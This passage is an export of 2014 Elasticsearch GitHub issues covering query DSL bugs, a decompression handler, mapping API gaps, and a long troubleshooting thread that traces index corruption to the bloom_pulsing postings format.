</description><key id="40080392">7242</key><summary>Remove `numeric_range` filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dadoonet</reporter><labels><label>:Query DSL</label><label>breaking</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T17:47:46Z</created><updated>2015-08-13T13:43:00Z</updated><resolved>2014-08-13T08:40:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-12T17:51:41Z" id="51950774">LGTM, I think this should go in master (aka 2.0) only?
</comment><comment author="dadoonet" created="2014-08-13T08:40:45Z" id="52023066">Closed by 655282a2c6321c6504fd958a5aaaf2929aaa74ca in master (2.0.0)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>A content decompressor that throws a human readable message when</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7241</link><project id="" key="" /><description>compression is disabled and the user sends compressed content.

This replaces https://github.com/elasticsearch/elasticsearch/pull/1678
</description><key id="40075849">7241</key><summary>A content decompressor that throws a human readable message when</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">derryx</reporter><labels><label>:REST</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T16:57:31Z</created><updated>2015-06-07T12:25:12Z</updated><resolved>2014-08-13T11:53:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-08-13T10:21:55Z" id="52031599">LGTM
</comment><comment author="dakrone" created="2014-08-13T11:53:35Z" id="52038603">Merged this to 1.x and master.
</comment><comment author="kimchy" created="2014-08-15T18:46:52Z" id="52343350">A bit late, but if we add the compression handler anyhow now, we might as well enable compression by default and thats it? the potential overhead now exists regardless with the additional handler, right?
</comment><comment author="derryx" created="2014-08-18T08:31:00Z" id="52464682">Yeah. That's right. BUT: with the changes applied you ALWAYS get a correct HTTP-answer from ES. Before when you disabled compression and sent compressed content you got a cryptic error message. That is why I changed the behavior.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Query DSL: Empty bool {} should return match_all</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7240</link><project id="" key="" /><description>This is somewhat related to the following request:
https://github.com/elasticsearch/elasticsearch/issues/6722

6722 actually causes a NPE when the clauses within the bool are null:

```
"bool" : {
    "must": [],
    "must_not": [],
    "should": []
  }
```

For this ticket, there are use cases when Kibana is generating requests like the following:

```
 "facet_filter": {
                "fquery": {
                    "query": {
                        "filtered": {
                            "query": {
                                "bool": {
                                }
                            },
                            "filter": {
                                "fquery": {
                                    "query": {
                                        "query_string": {
                                            "query": "_type:apache"
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
```

The above query ignores the facet_filter's filter clause when it should really be returning a match_all plus the filter applied.

When a query with just a bool {} is run on its own, the empty bool clause in this case does not throw a NPE and is treated as a valid query, except that it returns no documents (when it should really be returning a match_all):

```
   "query": {
         "bool": {
         }
    }
```
</description><key id="40073656">7240</key><summary>Query DSL: Empty bool {} should return match_all</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T16:35:08Z</created><updated>2014-09-08T15:12:11Z</updated><resolved>2014-08-27T12:08:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-12T17:21:24Z" id="51946614">An empty `bool` filter or query should be treated as a `match_all`.
</comment><comment author="brwe" created="2014-08-27T12:10:35Z" id="53561978">Fixed, but I did not push to 1.2 because this relies on a change that is also not on 1.2 (d414d89c6281f99c). Let me know if you need it on 1.2 as well.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOCS] Clarify Completion Suggester output deduplication</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7239</link><project id="" key="" /><description>Currently the doc for output deduplication is confusing (see #4255)
</description><key id="40066977">7239</key><summary>[DOCS] Clarify Completion Suggester output deduplication</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">areek</reporter><labels /><created>2014-08-12T15:30:08Z</created><updated>2014-08-18T13:40:20Z</updated><resolved>2014-08-13T15:19:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Index Corruption</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7238</link><project id="" key="" /><description>We have two nodes running in our elasticsearch set-up with the cluster regularly going into yellow state. As far as we have been able to determine, this is usually caused by a shard of one particular index regularly becoming unassigned. Restarting the elasticsearch instance helps for a short while (green state), but it usually turns yellow again in half an hour or so.
# Log File Excerpt:

[2014-08-12 13:16:15,183][INFO ][node                     ] [Natalie Portman] started
[2014-08-12 13:16:18,742][INFO ][gateway                  ] [Natalie Portman] recovered [19] indices into cluster_state
[2014-08-12 13:16:20,982][INFO ][cluster.service          ] [Natalie Portman] added {[Jennifer Lawrence][cTovvVXzSgmKBSgi9AoYaA][ip-XXXXX][inet[/XXXX]],}, reason: zen-disco-receive(join from node[[Jennifer Lawrence][cTovvVXzSgmKBSgi9AoYaA][XXXXX][inet[/XXXXX]]])
[2014-08-12 14:13:50,511][WARN ][index.merge.scheduler    ] [Natalie Portman] [fuelup-accounts-revisions][2] failed to merge
java.lang.ArrayIndexOutOfBoundsException: 219
    at org.apache.lucene.util.FixedBitSet.set(FixedBitSet.java:256)
    at org.apache.lucene.codecs.PostingsConsumer.merge(PostingsConsumer.java:87)
    at org.apache.lucene.codecs.TermsConsumer.merge(TermsConsumer.java:110)
    at org.apache.lucene.codecs.FieldsConsumer.merge(FieldsConsumer.java:72)
    at org.apache.lucene.index.SegmentMerger.mergeTerms(SegmentMerger.java:399)
    at org.apache.lucene.index.SegmentMerger.merge(SegmentMerger.java:112)
    at org.apache.lucene.index.IndexWriter.mergeMiddle(IndexWriter.java:4163)
    at org.apache.lucene.index.IndexWriter.merge(IndexWriter.java:3759)
    at org.apache.lucene.index.ConcurrentMergeScheduler.doMerge(ConcurrentMergeScheduler.java:405)
    at org.apache.lucene.index.TrackingConcurrentMergeScheduler.doMerge(TrackingConcurrentMergeScheduler.java:106)
    at org.apache.lucene.index.ConcurrentMergeScheduler$MergeThread.run(ConcurrentMergeScheduler.java:482)
[2014-08-12 14:13:50,515][WARN ][index.engine.internal    ] [Natalie Portman] [fuelup-accounts-revisions][2] failed engine [merge exception]
[2014-08-12 14:13:50,784][WARN ][cluster.action.shard     ] [Natalie Portman] [fuelup-accounts-revisions][2] sending failed shard for [fuelup-accounts-revisions][2], node[wqRW6lbSQ6yk1B3bxbCF6w], [R], s[STARTED], indexUUID [PMsFEnTWQ1e_uqGFx8yUXw], reason [engine failure, message [merge exception][MergeException[java.lang.ArrayIndexOutOfBoundsException: 219]; nested: ArrayIndexOutOfBoundsException[219]; ]]
[2014-08-12 14:13:50,785][WARN ][cluster.action.shard     ] [Natalie Portman] [fuelup-accounts-revisions][2] received shard failed for [fuelup-accounts-revisions][2], node[wqRW6lbSQ6yk1B3bxbCF6w], [R], s[STARTED], indexUUID [PMsFEnTWQ1e_uqGFx8yUXw], reason [engine failure, message [merge exception][MergeException[java.lang.ArrayIndexOutOfBoundsException: 219]; nested: ArrayIndexOutOfBoundsException[219]; ]]
[2014-08-12 14:13:50,888][WARN ][cluster.action.shard     ] [Natalie Portman] [fuelup-accounts-revisions][2] received shard failed for [fuelup-accounts-revisions][2], node[cTovvVXzSgmKBSgi9AoYaA], [P], s[STARTED], indexUUID [PMsFEnTWQ1e_uqGFx8yUXw], reason [engine failure, message [merge exception][MergeException[java.lang.ArrayIndexOutOfBoundsException: 219]; nested: ArrayIndexOutOfBoundsException[219]; ]]
[2014-08-12 14:13:50,890][WARN ][cluster.action.shard     ] [Natalie Portman] [fuelup-accounts-revisions][2] received shard failed for [fuelup-accounts-revisions][2], node[cTovvVXzSgmKBSgi9AoYaA], [P], s[STARTED], indexUUID [PMsFEnTWQ1e_uqGFx8yUXw], reason [master [Natalie Portman][wqRW6lbSQ6yk1B3bxbCF6w][ip-XXXXX][inet[/XXXXX]] marked shard as started, but shard has not been created, mark shard as failed]
[2014-08-12 14:13:52,371][WARN ][index.merge.scheduler    ] [Natalie Portman] [fuelup-accounts-revisions][2] failed to merge
## 

We have verified that the machines have both enough storage and memory, so we are wondering what is going wrong and how we could further debug this. Suggestions are appreciated.
</description><key id="40062522">7238</key><summary>Index Corruption</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">almer-fuel</reporter><labels /><created>2014-08-12T14:49:44Z</created><updated>2014-10-01T12:52:39Z</updated><resolved>2014-10-01T12:52:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-12T15:39:02Z" id="51932108">This looks like either index corruption or a Lucene issue.  What ES version are you using?  Are you able to reproduce this issue from a clean slate / minimal configuration?
</comment><comment author="almer-fuel" created="2014-08-14T11:05:48Z" id="52170538">We are using ES version 1.3.1 (upgraded from 1.2.1 running before). I have investigated it further and indeed it seems two of our indices were corrupted somehow. I have the corrupted data still so I could analyze it further to see what caused this. The disks containing the indices were not too large (about 8x larger than the data itself and filled for about 60 - 80%) I am hypothesizing that too little disk space when synchronizing shards across the machine could have been the cause, but I am not sure if that's a realistic assessment. If you have other suggestions that I could look into, those would be welcome. I want to rule out that this is an ES (or Lucene) issue.
</comment><comment author="mikemccand" created="2014-08-14T13:10:22Z" id="52180669">A disk full should not cause index corruption...

Are you able to reproduce the creation of the corrupted index?  Did you run CheckIndex on it (can you post the output if so)?

Also, I'd recommend upgrading to 1.3.2: there was a rare bug in the compression library that ES uses when moving shards around, that can introduce corruption.
</comment><comment author="almer-fuel" created="2014-09-01T15:33:29Z" id="54072443">Mike, we:
1) Upgraded our machines to 1.3.2
2) Put our indices on separate large volumes

Still we are getting regular index corruption, particularly on indices which have a lot of write operations, see the examples below.

Do you have a suggestions as to what the best approach is to debugging this? We'd be happy to do this, but are having some trouble figuring out the best place to start.

# Some examples:

[2014-09-01 15:09:44,799][WARN ][cluster.action.shard     ] [Jennifer Lawrence] [fuelup-accounts-revisions][2] received shard failed for [fuelup-accounts-revisions][2], node[eFW-40fxQiye18qoDPiJ_Q], [P], s[INITIALIZING], indexUUID [pEYC0ucUSIGun5KgVOoC0A], reason [Failed to start shard, message [IndexShardGatewayRecoveryException[[fuelup-accounts-revisions][2] failed to fetch index version after copying it over]; nested: CorruptIndexException[[fuelup-accounts-revisions][2] Corrupted index [corrupted_U1FKXejPRfGBoSRivrDxHQ] caused by: CorruptIndexException[codec footer mismatch: actual footer=1952805376 vs expected footer=-1071082520 (resource: NIOFSIndexInput(path="/esdata/fuelup-testing/nodes/0/indices/fuelup-accounts-revisions/2/index/_a_XBloomFilter_0.smy"))]]; ]]

[2014-09-01 15:04:19,366][WARN ][indices.cluster          ] [Jennifer Lawrence] [fuelup-manifests][4] failed to start shard
org.elasticsearch.index.gateway.IndexShardGatewayRecoveryException: [fuelup-manifests][4] failed to fetch index version after copying it over
    at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:152)
    at org.elasticsearch.index.gateway.IndexShardGatewayService$1.run(IndexShardGatewayService.java:132)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: org.apache.lucene.index.CorruptIndexException: [fuelup-manifests][4] Corrupted index [corrupted_jh_x1y9MS1SWKZefSFlVfQ] caused by: CorruptIndexException[codec footer mismatch: actual footer=1852273495 vs expected footer=-1071082520 (resource: NIOFSIndexInput(path="/esdata/fuelup-testing/nodes/0/indices/fuelup-manifests/4/index/_mi_XBloomFilter_0.smy"))]
    at org.elasticsearch.index.store.Store.failIfCorrupted(Store.java:343)
    at org.elasticsearch.index.store.Store.failIfCorrupted(Store.java:328)
    at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:119)

#     ... 4 more
</comment><comment author="mikemccand" created="2014-09-01T17:31:24Z" id="54080808">&gt; Do you have a suggestions as to what the best approach is to debugging this? 

It's important to get to the bottom of this, in case you're hitting a new bug here ...

Does this corruption reproduce on a brand new index created with 1.3.2?  I can't tell from your responses so far whether you are carrying forward an index from before...

Can you attach the server logs from all nodes that led up to the above exception?  It looks like a shard was migrated to another node, but then when that node tried to start the shard, it detected corruption.  We need to isolate where that corruption happened, either during indexing or during replication.

Can you zip up the data directory from the node that this shard was replicated from and post somewhere, if you allowed to share?  I can have a look and see if the corruption is present there.

Are you running any plugins, any external processes, etc.?
</comment><comment author="mikemccand" created="2014-09-01T17:51:01Z" id="54081972">Also, which CPU, OS, JVM version are you using?
</comment><comment author="almer-t" created="2014-09-01T18:09:49Z" id="54082978">Mike, thanks for your response, as for your questions:
A) It's on a brand new index (actually multiple indices) on 1.3.2, the index has custom mappings.
B) We're running on AWS (Ubuntu 14.04LTS). A shared Intel Xeon CPU E5-2650.
C) Java reports (Oracle Java 7):
java version "1.7.0_65"
Java(TM) SE Runtime Environment (build 1.7.0_65-b17)
Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)
D) Plugins are "cloud-aws" (2.3.0) and "head"

As for your other questions: I will look into what logs and index data I can share with you tomorrow. We will likely set-up a separate environment for replicating the problem. Naturally I'll share with you any "recipe" I can make for reproducing the problem.
</comment><comment author="mikemccand" created="2014-09-01T21:04:12Z" id="54091605">Thanks @almer-t that's great you can reproduce from a clean start; hopefully this means we can iterate until we find the root cause.  If you can narrow it down to a dedicated environment / particular set of documents / recipe that would be very helpful.

As far as I know that JVM version is safe.

Have you changed any settings from defaults (e.g. via settings API or in config/elasticsearch.yml)?
</comment><comment author="almer-fuel" created="2014-09-02T11:53:15Z" id="54140744">mike: I've haven't changed the defaults (apart from the number of master nodes, from 1-&gt;2, but the problem existed before this, so it's probably not the root cause).

## Here's some log information that shows the first signs of trouble:

[2014-09-02 09:07:51,137][WARN ][index.engine.internal    ] [Natalie Portman] [fuelup-manifests][3] failed engine [corrupt 
file detected source: [recovery phase 1]]
[2014-09-02 09:07:51,154][WARN ][cluster.action.shard     ] [Natalie Portman] [fuelup-manifests][3] sending failed shard fo
r [fuelup-manifests][3], node[3R-3HR1jQzOWsct8tIlO8w], [P], s[STARTED], indexUUID [xlRTKIXsSq6HO_BHWIA4Fg], reason [engine 
failure, message [corrupt file detected source: [recovery phase 1]][RecoverFilesRecoveryException[[fuelup-manifests][3] Fai
led to transfer [0] files with total size of [0b]]; nested: CorruptIndexException[[fuelup-manifests][3] Corrupted index [corrupted_dXHcg1AkQtGuplAHa87jqw] caused by: CorruptIndexException[codec footer mismatch: actual footer=1852273495 vs expected footer=-1071082520 (resource: NIOFSIndexInput(path="/esdata/fuelup-testing/nodes/0/indices/fuelup-manifests/3/index/_b_XBloomFilter_0.smy"))]]; ]]
...
[2014-09-02 09:07:51,201][WARN ][indices.cluster          ] [Natalie Portman] [fuelup-manifests][3] master [[Natalie Portman][3R-3HR1jQzOWsct8tIlO8w][ip-10-0-1-20][inet[/10.0.1.20:9300]]] marked shard as started, but shard has not been created, mark shard as failed
...
[2014-09-02 09:07:51,352][WARN ][indices.cluster          ] [Natalie Portman] [fuelup-manifests][3] failed to start shard
org.elasticsearch.index.gateway.IndexShardGatewayRecoveryException: [fuelup-manifests][3] failed to fetch index version after copying it over
        at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:152)
        at org.elasticsearch.index.gateway.IndexShardGatewayService$1.run(IndexShardGatewayService.java:132)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:745)
Caused by: org.apache.lucene.index.CorruptIndexException: [fuelup-manifests][3] Corrupted index [corrupted_dXHcg1AkQtGuplAHa87jqw] caused by: CorruptIndexException[codec footer mismatch: actual footer=1852273495 vs expected footer=-1071082520 (resource: NIOFSIndexInput(path="/esdata/fuelup-testing/nodes/0/indices/fuelup-manifests/3/index/_b_XBloomFilter_0.smy"))]
        at org.elasticsearch.index.store.Store.failIfCorrupted(Store.java:343)
        at org.elasticsearch.index.store.Store.failIfCorrupted(Store.java:328)
        at org.elasticsearch.index.gateway.local.LocalIndexShardGateway.recover(LocalIndexShardGateway.java:119)

##         ... 4 more

All except the first message then repeats (particularly the 2nd and the last)
</comment><comment author="almer-fuel" created="2014-09-02T13:10:43Z" id="54148487">We are currently using three machines. I split this into a 1/2 situation (by renaming the cluster and moving around some files). So I ended up with a cluster A with 1 machine and a cluster B with 2 machines. I have tried our read/write operations on both A and B and can not trivially reproduce the errors above. I have to say though that usually they occur "after a while", so we'll have to wait a bit.

I have found that when corruption does occur its detection can be triggered by:
1) creating a backup snapshot.
2) restarting a machine in the cluster.
3) changing the replication settings of a corrupted index.

Examing log files when corruption did occur (from yesterday when it was still a 3-machine cluster), it seems that this message repeats often, with the exact _same_ values:
"CorruptIndexException[codec footer mismatch: actual footer=1852273495 vs expected footer=-1071082520"

Also this is a bit awkward:
"[RecoverFilesRecoveryException[[fuelup-manifests][3] Failed to transfer [0] files with total size of [0b]]"

A wild guess: can it be that the volume where the elasticsearch data is stored is (for a brief instant) disconnected and then reconnected, which may cause this to occur?

Mike: I am also sending you the complete log files (privately).
</comment><comment author="mikemccand" created="2014-09-02T14:05:17Z" id="54155973">Thanks @almer-fuel 

Can you enable CheckIndex on startup, by adding "index.shard.check_on_startup: true" to your config/elasticsearch.yml?  Then restart a node and it should run CheckIndex on all its shards; it runs for a while and then suddenly prints out lots of output (from Lucene's CheckIndex tool)... I'm hoping we can isolate when the corruption happens.

Are you able to get the corruption to happen if you use 1 shard 0 replicas?  Just trying to simplify the recipe as much as possible.

I would definitely not expect this kind of corruption if a volume disconnects/reconnects; only if the volume is buggy (flips/loses/adds bits) should you see this kind of corruption.

Does the corruption always happen in a *.smy file?
</comment><comment author="rmuir" created="2014-09-02T14:21:17Z" id="54158342">This is the .smy file from pulsing codec. it doesnt have a checksum... its basically incompatible with elasticsearch (and was just an experiment). Pulsing codec is actually removed from lucene since this optimization has been in the default codec for years. I recommend turning it off.
</comment><comment author="almer-fuel" created="2014-09-02T14:41:34Z" id="54161500">Mike: checkindex set, restarting any of the machines does not yield a corrupted index (yet) as of now.

Mike &amp; muir:
Hmmm, yes the corruption always happens in an smy file. All the corrupted indexes have at least a mapping where "postings_format" : "bloom_pulsing" is used. I hypothesized this could have been the problem in a mail to Mike.

rmuir:
Would you recommend in general leaving postings_format alone? (I can't seem to find it anymore in the current elasticsearch documentation). Also: if this can cause index corruption it should be disabled.
</comment><comment author="mikemccand" created="2014-09-02T14:59:14Z" id="54164434">Hi @almer-fuel hmm I can't find your private email to me ...

The pulsing postings format is being removed from Lucene; what it does (folding terms with just one doc into the terms dict) is already being done by the default postings format.  I would recommend just using the default ...

But, I don't think this can explain the original AIOOBE you hit; are you able to reproduce that exception?
</comment><comment author="almer-fuel" created="2014-09-02T15:11:11Z" id="54166299">Check your spam :) (if you can't find it, i'll resend).

No, it can't explain the AIOOBE, but we have not yet seen that problem recur (perhaps we should split this bug into two, one concerning the AIOOBE still unexplained, the other about the postings_format, I am changing our index definitions, so I should be able to confirm within several days that the problem does not re-occur).
</comment><comment author="budnik" created="2014-09-04T08:43:41Z" id="54432987">We ecountered same issue multiple times. We were using 'postings_format" : "bloom_pulsing" for one of the fields. I hope switching back to default would help and thanks for helping me figuring it out. 
</comment><comment author="mikemccand" created="2014-09-04T15:37:17Z" id="54496263">Thanks @almer-fuel I found the email ...

Let's leave this issue open to dig into the AIOOBE?
</comment><comment author="almer-fuel" created="2014-09-04T17:38:10Z" id="54515281">@budnik @mikemccand Removing the bloom_pulsing helped restore our cluster to a stable state. So, it's confirmed to have been the cause of our (non-AIOOBE) problems.

@mikemccand Yes, we will keep an eye on whether the AIOOBE occurs again (and/or if we can reproduce it in a separate testing environment). If so, we will post our updates here. It could also be that the issues are somehow linked (the AIOOBE being a side effect of the bloom-pulsing issues), but I can't say that for sure. I'll keep an eye on it.

Thanks for the help! :pray: 
</comment><comment author="deverton" created="2014-10-01T03:30:09Z" id="57414697">We just rolled out a new cluster on 1.3.2 and got this after a restart.

```
[2014-10-01 11:24:19,381][WARN ][cluster.action.shard     ] [node1.example.com] [index-20130125][1] sending failed shard for [index-20130125][1], node[2LBNSJCMQByFpj0LgKZjJw], relocating [JT1xYUsPQkyEgLzDmBAvhA], [P], s[INITIALIZING], indexUUID [uNfol8JNQ_GZCMEzT07uvQ], reason [engine failure, message [corrupted preexisting index][CorruptIndexException[[reviews-20130125][1] Corrupted index [corrupted_yHFUTG8eQMWqLbRwRHtPaA] caused by: CorruptIndexException[codec footer mismatch: actual footer=1230204780 vs expected footer=-1071082520 (resource: MMapIndexInput(path="/opt/elasticsearch/data/elasticsearch_1_3/nodes/0/indices/index-20130125/1/index/_am.fdt"))]]]]
```

This was on a two node cluster and the index was created from scratch. There are no other indices in this cluster either. The index mapping is fairly simple and doesn't involve any changes to codecs or anything so I don't think this is bloom related.
</comment><comment author="s1monw" created="2014-10-01T07:34:13Z" id="57428762">hmm the index name says `reviews-20130125` so it seems like it's a pretty old index? You said it was newly created so I am a bit confused. Can you check if there is a file called `corrupted_yHFUTG8eQMWqLbRwRHtPaA` inside the index/shard directory and gist it's content?
</comment><comment author="deverton" created="2014-10-01T09:12:32Z" id="57437834">Hah, sorry, my attempt at masking data didn't quite work out. While the index name indicates it's old, it's actually just the version of the mapping. It was replicated from a CouchDB instance as part of the deployment of 1.3.2.

I'll see if we still have `corrupted_yHFUTG8eQMWqLbRwRHtPaA` in the data directory. It might have been destroyed as we recreated the ES 1.3.2 instances just to be sure.
</comment><comment author="s1monw" created="2014-10-01T12:52:39Z" id="57458223">I am closing this issue for now...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping: Get field mapping does not return _analyzer and _boost fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7237</link><project id="" key="" /><description>The [get field mapping API](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/indices-get-field-mapping.html#indices-get-field-mapping) 

returns all the [special fields](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-fields.html) except for the [_analyzer field](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-analyzer-field.html) and [_boost](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-boost-field.html) fields.

Given the following mapping

```
PUT /nest_test_data-1340/specialdto/_mapping
{
  "specialdto": {
    "_id": {
      "path": "myOtherId",
      "index": "not_analyzed",
      "store": false
    },
    "_source": {
      "enabled": false,
      "compress": true,
      "compress_threshold": "200b",
      "includes": [
        "path2.*"
      ],
      "excludes": [
        "path1.*"
      ]
    },
    "_type": {
      "index": "analyzed",
      "store": true
    },
    "_all": {
      "enabled": true,
      "store_term_vector_positions": true,
      "index_analyzer": "default",
      "search_analyzer": "default"
    },
    "_analyzer": {
      "index": "yes",
      "path": "name"
    },
    "_boost": {
      "name": "boost",
      "null_value": 1.0
    },
    "_parent": {
      "type": "person"
    },
    "_routing": {
      "required": true,
      "path": "name"
    },
    "_index": {
      "enabled": false,
      "store": true
    },
    "_size": {
      "enabled": false,
      "store": true
    },
    "_timestamp": {
      "enabled": true,
      "path": "timestamp",
      "format": "yyyy"
    },
    "_ttl": {
      "enabled": false,
      "default": "1d"
    }
  }
}
```

Doing a GET for all the special fields:

```
GET http://localhost:9200/nest_test_data-1340/_mapping/specialdto/field/_%2A
```

returns:

```
{
  "nest_test_data-1340" : {
    "mappings" : {
      "specialdto" : {
        "_type" : {
          "full_name" : "_type",
          "mapping":{"_type":{"store":true}}
        },
        "_version" : {
          "full_name" : "_version",
          "mapping":{}
        },
        "_id" : {
          "full_name" : "_id",
          "mapping":{"_id":{"index":"not_analyzed","path":"myOtherId"}}
        },
        "_source" : {
          "full_name" : "_source",
          "mapping":{"_source":{"enabled":false,"compress":true,"compress_threshold":"200b","includes":["path2.*"],"excludes":["path1.*"]}}
        },
        "_routing" : {
          "full_name" : "_routing",
          "mapping":{"_routing":{"required":true,"path":"name"}}
        },
        "_timestamp" : {
          "full_name" : "_timestamp",
          "mapping":{"_timestamp":{"enabled":true,"path":"timestamp","format":"yyyy"}}
        },
        "_index" : {
          "full_name" : "_index",
          "mapping":{"_index":{"enabled":false}}
        },
        "_ttl" : {
          "full_name" : "_ttl",
          "mapping":{"_ttl":{"enabled":false}}
        },
        "_size" : {
          "full_name" : "_size",
          "mapping":{"_size":{"enabled":false}}
        },
        "_uid" : {
          "full_name" : "_uid",
          "mapping":{}
        },
        "_all" : {
          "full_name" : "_all",
          "mapping":{"_all":{"store_term_vectors":true,"store_term_vector_positions":true,"analyzer":"default"}}
        },
        "_parent" : {
          "full_name" : "_parent",
          "mapping":{"_parent":{"type":"person"}}
        }
      }
    }
  }
}
```

without including `_analyzer` and `_boost` in the response.
</description><key id="40055874">7237</key><summary>Mapping: Get field mapping does not return _analyzer and _boost fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">Mpdreamz</reporter><labels><label>bug</label></labels><created>2014-08-12T13:43:33Z</created><updated>2015-03-19T15:42:28Z</updated><resolved>2015-02-23T15:33:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-09-01T15:00:12Z" id="54068633">There is two issues:
1. `_boost` field mapping can be retrieved  as `"boost"`, not as `"_boost"` with a field mapping request because it was given the `"name": "boost"`. I can change that but I am unsure what is the expected behavior here.
